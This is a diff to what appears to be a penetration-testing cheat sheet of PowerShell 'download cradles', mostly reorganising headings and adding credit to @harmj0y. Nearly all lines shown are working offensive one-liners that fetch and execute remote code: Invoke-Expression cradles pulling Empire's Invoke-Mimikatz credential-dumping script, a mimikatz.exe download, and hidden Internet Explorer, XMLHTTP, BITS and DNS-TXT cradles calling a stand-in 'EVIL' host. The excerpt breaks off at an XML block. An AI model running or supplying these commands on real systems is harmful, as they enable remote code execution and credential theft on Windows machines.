@@ -14,12 +14,21 @@ IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/mod
 Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
 
 
-### powershell 3.0+ download and execute (bypass IE firstrun check)
+### powershell download cradles
+
+by @harmj0y
+
+Links:
+
+https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+
+
+#### powershell 3.0+ download and execute (bypass IE firstrun check)
 
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -UseBasicParsing)
 
 
-### powershell (any version)
+#### powershell (any version)
 
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
 
@@ -27,17 +36,17 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuse
 (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1", "C:\Users\Public\Invoke-Mimikatz.ps1")
 
 
-### hidden IE com object
+#### hidden IE com object
 
 $ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
 
 
-### Msxml2.XMLHTTP COM object
+#### Msxml2.XMLHTTP COM object
 
 $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
 
 
-### WinHttp COM object
+#### WinHttp COM object
 
 [System.Net.WebRequest]::DefaultWebProxy
 [System.Net.CredentialCache]::DefaultNetworkCredentials
@@ -55,8 +64,7 @@ Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t
 IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
 
 
-
-### from @subtee
+from @subtee
 
 <#
 <?xml version="1.0"?>
